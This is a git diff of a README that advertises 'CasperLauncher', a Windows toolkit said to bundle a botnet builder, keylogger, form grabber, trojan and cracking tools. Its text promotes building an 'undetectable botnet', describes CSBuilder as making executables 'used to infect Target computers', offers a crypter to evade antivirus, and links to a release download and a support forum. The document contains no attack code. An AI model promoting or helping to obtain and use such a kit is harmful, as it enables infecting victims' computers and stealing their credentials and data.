@@ -1,42 +1,39 @@
-# CasperLauncher - Most Complete Attacker
+# CasperLauncher 
+
+[![Preview image](https://fbcdn-sphotos-d-a.akamaihd.net/hphotos-ak-xfp1/v/t1.0-9/s720x720/11024_982985041717337_2654427820202581873_n.jpg?oh=2ca7a0cc8d406f22ce2239934e37d820&oe=55193BBD&__gda__=1427204848_286e6385e0b07040487af2924d6e6a4d)]
+
+CasperLauncher is a Hacking Framework Interface built for Windows. it’s most Complete Security Tools Package
+Included: CasperSpy ver2.1, Botnet, Cracking Tools, Exploit, FormGrabber, Keylogger, Trojan and Social Engginering 
+
+##  Most Complete Attacker
 
 [![Preview image](https://scontent-b-sin.xx.fbcdn.net/hphotos-xpa1/v/t1.0-9/10365880_982912881724553_6014788293436251191_n.jpg?oh=128dd15916973df2e82d0ffaa6175ff2&oe=551D430D)](http://www.youtube.com/watch?v=pG-0WId0SxA)
 
-CasperLauncher is a Hacking Framework Interface built for Windows. it’s most Complete Security Tools Package
-Included:
-* CasperSpy ver2.1
-* Botnet
-* Cracking Tools
-* Exploit
-* FormGrabber
-* Keylogger
-* Trojan
-* Social Engginering
-
-## With Complete Guides and Tutorial
-
-![Guide](https://scontent-a-sin.xx.fbcdn.net/hphotos-xaf1/v/t1.0-9/s720x720/10806256_982932011722640_452064625651458105_n.jpg?oh=b29c1ea924d38e2f2a8ae784fa134351&oe=55174681)
-
-**All tools in CasperLauncher equipped by Tutorial and Guide How to use it**
-
-So you can easily use any toolkit therein.
+All tools in CasperLauncher equipped by Tutorial and Guide How to use it
+so you can easily use any toolkit therein.
 CasperLauncher is distributed in the hope that it will be useful.
 
 ***
 
 # CasperSpy - Effortless Botnet Builder 
 
-**The easiest way to build Undetectable Botnet**
-
 [![Preview image](https://fbcdn-sphotos-b-a.akamaihd.net/hphotos-ak-xpa1/v/t1.0-9/10675757_982922371723604_1389677735045922449_n.jpg?oh=d081e4a0792efdfca758507dfd11a07f&oe=55158129&__gda__=1427388561_439c13f7d9f3221e467b6a0e18713942)](https://www.youtube.com/watch?v=m8PTBXZBK5E)
 
-## How Does CasperSpy Work?
+**The easiest way to build Undetectable Botnet**
 
 **CasperSpy** is toolkit that provide a bot creation all of the tools required to build and administer a botnet.
-**CSBuilder** tool allows to create the executables that will be used to infect Target computers.
+
 **CasperSpy Panel** is web based control panel used to maintain and update the botnet, and to retrieve/organize recovered information through a browser. 
 
-## [Download New Release here](https://github.com/dhanumurti/casperspy/releases)
+## CSBuilder 
+
+![CsBuilder](https://landerstorage.blob.core.windows.net/lander-user-images/LanderUserGallery_49485/image_4efd5952-3d34-4f7a-a18a-9e9dcfb6c14d_)
+
+**CSBuilder** tool allows to create the executables that will be used to infect Target computers.
+You can create Bot Instantly using thist tool with Easy Configuration.
+Then make your bot undetectable in our Crypter.
+
+# [Download New Release here](https://github.com/dhanumurti/casperspy/releases)
 
 # Scan Result
 
@@ -66,6 +63,8 @@ This is the content of **Start.bat** script:
 `start casperlauncher.exe`
 
 ***
+
+# [Have a Question? or Found a Problem](https://groups.google.com/forum/#!forum/casperspy)
 
 # DISCLAIMER EULA
 
